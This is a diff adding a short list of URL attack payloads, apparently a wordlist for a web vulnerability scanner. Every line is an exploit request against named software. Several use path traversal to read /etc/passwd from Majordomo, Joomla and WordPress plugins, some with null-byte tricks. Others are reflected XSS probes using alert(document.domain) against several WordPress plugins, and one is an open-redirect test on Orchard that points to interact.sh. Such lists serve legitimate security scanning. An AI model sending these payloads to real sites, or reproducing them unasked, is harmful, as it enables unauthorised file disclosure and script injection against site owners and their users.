@@ -1,0 +1,15 @@
+/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd
+/wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+/includes/lib/gz.php?file=/themes/../../../../../../../../../etc/passwd
+/snarf_ajax.php?url=1&ajax=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-content/plugins/flash-album-gallery/facebook.php?i=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/index.php?option=com_kp&controller=../../../../../../../../../../../../etc/passwd%00
+/wp-content/plugins/adminimize/adminimize_page.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+/wp-content/plugins/alert-before-your-post/trunk/post_alert.php?name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-content/plugins/skysa-official/skysa.php?submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/wp-content/plugins/clickdesk-live-support-chat/clickdesk.php?cdwidgetid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/orchard/Users/Account/LogOff?ReturnUrl=%2f%2fhttp://interact.sh%3f
+/wp-content/plugins/featurific-for-wordpress/cached_image.php?snum=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
